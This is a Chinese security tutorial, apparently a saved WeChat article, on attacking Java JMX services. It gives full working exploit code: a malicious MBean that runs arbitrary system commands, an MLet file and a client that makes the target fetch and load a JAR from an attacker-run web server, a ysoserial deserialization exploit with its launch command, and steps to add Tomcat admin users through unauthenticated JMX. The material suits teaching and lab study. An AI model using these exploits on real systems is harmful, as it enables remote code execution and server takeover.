> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LZCA4mKFZPOaq8KAx4HQbw)

前言 JMX 介绍    1. JMX 代码演示及架构    2. 使用 jconsole 图形工具监视、管理 JMX 使用 MLet 攻击 JMX    1. 介绍 MLet 及攻击过程    2. MLet 攻击示例代码    3. 小结通过 MBean 方法参数反序列化攻击 JMX    1. JMX 调用 MBean 的流程    2. 反序列化攻击代码    3. 小结其他反序列化攻击 JMX 的方式利用中间件等的特殊 MBean 攻击 JMX    1. 通过 JMX 攻击 Tomcat        环境配置        获取已有用户的密码        添加管理员角色用户参考链接

前言
--

本文对 JMX 进行介绍，分析 JMX 的各个攻击面，最后学习各个中间件中存在的 JMX 相关漏洞。

JMX 介绍
------

JMX（Java ManagementExtensions）是一种 Java 技术，为**管理**和**监视**应用程序、系统对象、设备（如打印机）和面向服务的网络提供相应的工具。

JMX 可以被理解为 SNMP（简单网络管理协议）的 “Java 版本”。SNMP 主要用于监控网络组件，如网络交换机或路由器。

与 SNMP 一样，JMX 也用于**监视基于 Java 的应用程序**。JMX 最常见的应用场景，就是在 Nagios、Icinga 或 Zabbix 等集中式监控解决方案中用于监控 Java 应用服务器的可用性和性能。

### 1. JMX 代码演示及架构

先贴一张 JMX 的架构图，后面结合代码 demo 进行讲解。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N31nZxPAhXGpOL09llicTfjS1vvLCLoEUcfyI01oWhyBVZKDn7jt4L1GQ/640?wx_fmt=png)

以下项目启动一个基于 RMI 的 JMX 服务，并注册一个 MBean。

项目结构：

```
├── HelloWorldMBean.java
├── HelloWorld.java
└── jmxDemo.java

```

`HelloWorldMBean.java`

```
package com.example;

public interface HelloWorldMBean {
   public void sayhello();
   public int add(int x, int y);
   public String getName();
}


```

`HelloWorld.java`

```
package com.example;

public class HelloWorld implements HelloWorldMBean {
   private String name = "com.example";

   @Override
   public void sayhello() {
       System.out.println("hello world " + this.name);
  }

   @Override
   public int add(int x, int y) {
       return x + y;
  }

   @Override
   public String getName() {
       return this.name;
  }
}


```

`jmxDemo.java`

```
package com.example;

import javax.management.*;
import javax.management.remote.JMXConnectorServer;
import javax.management.remote.JMXConnectorServerFactory;
import javax.management.remote.JMXServiceURL;
import java.lang.management.ManagementFactory;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class jmxDemo {
   public static void main(String[] args) throws Exception {
       MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
       ObjectName objectName = new ObjectName("test:type=HelloWorld");
       HelloWorld mbean = new HelloWorld();
       mBeanServer.registerMBean(mbean, objectName);

       Registry registry = LocateRegistry.createRegistry(1099);

       JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/jmxrmi");
       JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
       jmxConnectorServer.start();
       System.out.println("Server start...");
  }


}


```

结合上面的架构图及 demo 代码，可以看到整个 JMX 分为三层。

*   **Probe Level**
    

实例化 HelloWorldMBean 类为 mbean。

主要关注两种类型的 mbean。

standard MBean：它能管理的资源（包括属性，方法，时间）必须定义在接口中，实例化的 MBean 必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的 MBean 为 Hello，则接口必须为 HelloMBean。

dynamic MBean：必须实现`javax.management.DynamicMBean`接口，所有的属性，方法都在运行时定义。

*   **Agent Level**
    

创建了 MBeanServer 实例。

主要提供对资源的注册和管理。注册了 mbean（具有唯一 ObjectName）。

*   **Remote Management Level**
    

创建了 JMXServiceURL，绑定到本地 1099 端口的 RMI 服务（基于 RMI 服务的），关联到 MBeanServer。

### 2. 使用 jconsole 图形工具监视、管理 JMX

`jconsole`是基于 JMX 的可视化监视、管理工具，该工具是 JDK 的一部分，可以通过如下命令运行：

```
"%JAVA_HOME%/bin/jconsole.exe"
or
javaw -jar "%JAVA_HOME%/lib/jconsole.jar"

```

本地可以通过进程方式进行连接，远程可以通过`ip:port`方式进行连接。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N3gIHkpdibtceHyjSZscFXaL48fdEuyLQ5mkI3B8GL6yfoK9GcNNXJ8hg/640?wx_fmt=png)

可以用来获取 / 设置 bean 属性，或调用方法。存在其他默认的 mbean 对象实例。

使用 MLet 攻击 JMX
--------------

### 1. 介绍 MLet 及攻击过程

Mlet 是一个类：`javax.management.loading.MLet`，这是一个 mbean（实现接口`MLetMBean`）。该 mbean 存在一个方法`getMBeansFromURL`，可以从远程 mlet server 加载 mbean。

通过 MLet 这个 mbean 的函数功能我们就能得出使用 MLet 攻击 JMX 的攻击过程：

1.  启动托管 MLet 文件和含有恶意 MBean 的 JAR 文件的 Web 服务器
    
2.  使用 JMX 在目标服务器上创建 MBean `javax.management.loading.MLet`的实例
    
3.  调用 MBean 实例的`getMBeansFromURL`方法，将 Web 服务器的 MLet 文件 URL 作为参数进行传递。JMX 服务将连接到 http 服务器并解析 MLet 文件
    
4.  JMX 服务下载并归档 MLet 文件中引用的 JAR 文件中的恶意 MBean，使恶意 MBean 可通过 JMX 获取
    
5.  攻击者最终通过 JMX 调用恶意 MBean 的方法达到攻击目的
    

### 2. MLet 攻击示例代码

首先创建恶意 jar 文件，将下面的恶意 mbean 打包成`Evil.jar`：

`EvilMBean.java`

```
package com.mlet.example;

public interface EvilMBean {
   public String runCommand(String cmd);
}


```

`Evil.java`

```
package com.mlet.example;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Evil implements EvilMBean {
   public String runCommand(String cmd)
  {
       try {
           Runtime rt = Runtime.getRuntime();
           Process proc = rt.exec(cmd);
           BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
           BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
           String stdout_err_data = "";
           String s;
           while ((s = stdInput.readLine()) != null)
          {
               stdout_err_data += s+"\n";
          }
           while ((s = stdError.readLine()) != null)
          {
               stdout_err_data += s+"\n";
          }
           proc.waitFor();
           return stdout_err_data;
      }
       catch (Exception e)
      {
           return e.toString();
      }
  }
}


```

MLet 文件是一个类似于 HTML 的文件，可以通过 Web 服务器提供。

`mlet.txt`

```
<html><mlet code="com.mlet.example.Evil" archive="Evil.jar" ></mlet></html>

```

`code="com.mlet.example.Evil"`为恶意 mbean 的路径；

`archive="Evil.jar"`为恶意 mbean 的 jar 包；

可自定义，遵循`OBjectname`规则；

`codebase="http://127.0.0.1:4141"`访问为 jar 包的 url。

将`Evil.jar`和`mlet.txt`放在同一目录，`python3 -m http.server 4141`启动 web 服务。

web 服务准备完毕，运行如下代码攻击 JMX。

`ExploitJMXByRemoteMBean.java`

```
package com.mlet.example;

import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.util.HashSet;
import java.util.Iterator;

public class ExploitJMXByRemoteMBean {
   public static void main(String[] args) throws MalformedURLException {
       connectAndOwn("127.0.0.1", "1099", "ipconfig");
  }

   static void connectAndOwn(String serverName, String port, String command) throws MalformedURLException {
       try {
           // step1. 通过rmi创建 jmx连接
           JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
           System.out.println("URL: " + u + ", connecting");
           JMXConnector c = JMXConnectorFactory.connect(u);
           System.out.println("Connected: " + c.getConnectionId());
           MBeanServerConnection m = c.getMBeanServerConnection();

           // step2. 加载特殊MBean：javax.management.loading.MLet
           ObjectInstance evil_bean = null;
           ObjectInstance evil = null;
           try {
               evil = m.createMBean("javax.management.loading.MLet", null);
          } catch (javax.management.InstanceAlreadyExistsException e) {
               evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
          }
           // step3：通过MLet加载远程恶意MBean
           System.out.println("Loaded "+evil.getClassName());
           Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL", new Object[]
                          { "http://192.168.118.1:4141/mlet.txt" },
                   new String[] { String.class.getName() } );

           HashSet res_set = ((HashSet)res);
           Iterator itr = res_set.iterator();
           Object nextObject = itr.next();
           // 如果恶意mbean已经存在，则直接获取
           if (nextObject instanceof InstanceAlreadyExistsException)
          {
               //
               evil_bean = m.getObjectInstance(new ObjectName("MLetCompromise:));
          } else if (nextObject instanceof Exception) {
               throw ((Exception)nextObject);
          } else {
               evil_bean = ((ObjectInstance)nextObject);
          }

           // step4: 执行恶意MBean
           System.out.println("Loaded class: "+evil_bean.getClassName()+" object "+evil_bean.getObjectName());
           System.out.println("Calling runCommand with: "+command);
           Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{ command }, new String[]{ String.class.getName() });
           System.out.println("Result: "+result);
      } catch (Exception e)
      {
           e.printStackTrace();
      }
  }
}


```

### 3. 小结

该攻击方法在启用 JMX 身份验证时受限制。启用身份验证后的主要影响有两点，一是使用 JMX 服务时必须提供相应的凭证，二是无法调用`getMBeansFromURL`。

所以在启用 JMX 身份验证之后，还必须设置`jmx.remote.x.mlet.allow.getMBeansFromURL=true`才能调用 getMBeansFromURL，MBeanServerAccessController 的部分实现细节：

```
final String propName ="jmx.remote.x.mlet.allow.getMBeansFromURL";
GetPropertyAction propAction = new GetPropertyAction(propName);
String propValue = AccessController.doPrivileged(propAction);
boolean allowGetMBeansFromURL ="true".equalsIgnoreCase(propValue);
if (!allowGetMBeansFromURL) {
    throw new SecurityException("Access denied! MLet method " +
            "getMBeansFromURLcannot be invoked unless a " +
            "security manageris installed or the system property " +
            "-Djmx.remote.x.mlet.allow.getMBeansFromURL=true" +
            "isspecified.");
}

```

通过 MBean 方法参数反序列化攻击 JMX
-----------------------

### 1. JMX 调用 MBean 的流程

JMX 调用远程 MBean 方法的流程可以简单概括：

1.  将`MBean name`、`MBean Function Name`、`params`发送给远程 rmi server，其中 params 的处理需要注意下，先转为`MarshalledObject`，再`writeObject`为 String 对象，然后进入网络传输；
    
2.  RMI Server 监听到网络请求包含`MBean name`、`MBean Function Name`、`params`，其中 params 经过`MarshalledObject.readObject()`反序列化，再通过 invoke 调用原函数。
    

攻击者只需传递**恶意对象**作为参数，而不仅限于传递 String。JMX 使得这一切变得非常容易，因为用于调用远程 MBean 方法的`MBeanServerConnection.invoke`方法需要传递两个数组，一个是参数，一个是参数的签名。**只需参数签名（String.class.getName()）校验成功即可**。  

### 2. 反序列化攻击代码

ysoserial 中已经集成该 payload：

`ysoserial.exploit.JMXInvokeMBean`

```
package ysoserial.exploit;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

import ysoserial.payloads.ObjectPayload.Utils;

/*
* Utility program for exploiting RMI based JMX services running with required gadgets available in their ClassLoader.
* Attempts to exploit the service by invoking a method on a exposed MBean, passing the payload as argument.
*
*/
public class JMXInvokeMBean {

public static void main(String[] args) throws Exception {

if ( args.length < 4 ) {
System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <payload_type> <payload_arg>");
System.exit(-1);
}
 
JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/jmxrmi");
       
JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

// create the payload
Object payloadObject = Utils.makePayloadObject(args[2], args[3]);  
ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

//close the connection
jmxConnector.close();
  }
}

```

需要在启动的 JMX 项目里添加相关的 gadget，这里使用`CommonsCollections7`这条链，将`commons-collections 3.1`添加到 JMX 项目依赖中。

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JMXInvokeMBean 127.0.0.1 1099 CommonsCollections7 calc

```

### 3. 小结

使用`java.util.logging:type=Logging`比较通用，换其他 ObjectName 也行，比如`com.sun.management:type=DiagnosticCommand`。

`getLoggerLevel`为 read 操作，不会影响到系统，getParentLoggerLevel、setLoggerLevel 也都可以。

其他反序列化攻击 JMX 的方式
----------------

利用中间件等的特殊 MBean 攻击 JMX
----------------------

### 1. 通过 JMX 攻击 Tomcat

#### 环境配置

Tomcat 中默认不开启 JMX 服务，需要在`catalina.bat`中配置启动参数（参考文章 https://www.linuxidc.com/Linux/2019-12/161854.htm ）：

```
set "CATALINA_OPTS=%CATALINA_OPTS% -Dcom.sun.management.jmxremote -DJava.rmi.server.host
rem   CATALINA_OPTS   (Optional) Java runtime options used when the "start",
rem                   "run" or "debug" command is executed.
rem                   Include here and not in JAVA_OPTS all options, that should
rem                   only be used by Tomcat itself, not by the stop process,
rem                   the version command etc.
rem                   Examples are heap size, GC logging, JMX ports etc.

```

在`9999`端口启动一个无认证的 JMX 服务。

使用`jconsole`连接到本地 tomcat 启动的 JMX 服务。

#### 获取已有用户的密码

本地环境需要先在`tomcat-users.xml`中配置登录用户及角色。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N36tOqgvk2lZRib7FMY4OfanavtniaibPRe9ltvicBBBFVG164pv3gLiakmPA/640?wx_fmt=png)

#### 添加管理员角色用户

`Users`->`UserDatabase`节点下，创建用户：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N3eVfXr0Ywm3OFHTBpaECjVMnGXp8AqvVvX18rS9Loibqo1KHkvFXic3mQ/640?wx_fmt=png)

`Users`->`UserDatabase`节点下，创建角色（这里我已经存在`manager-gui`角色了）：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N3EMgeyJWLKz0EHzbXnqyhicJUFn05Qib2tgLYwf7EL6kHHYscSct1zEvg/640?wx_fmt=png)

`Users`->`User`->`[用户名]`节点下，将创建的用户与创建的角色关联：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N3YGpP2uT4TicWuhZ5xB1r2fia5cxuT3ib4ZnCgyaQFoOvwHPKIq1y7qroQ/640?wx_fmt=png)

保存配置：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX7e3cG40Yaoo3tHbCWn2N3Kc1hCAHDXweBd33wcibF53eIuibyOzhmIe936ejUPoUcJYH8J0C9yeQg/640?wx_fmt=png)

就可以使用创建的用户登录 manager。

参考链接
----

https://m0d9.me/2020/05/25/JMX%E7%B3%BB%E5%88%97%EF%BC%9A%E4%BB%80%E4%B9%88%E6%98%AFJMX%EF%BC%88%E4%B8%80%EF%BC%89/

https://nosec.org/home/detail/2544.html

https://www.hacking8.com/bug-product/Tomcat/%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat.html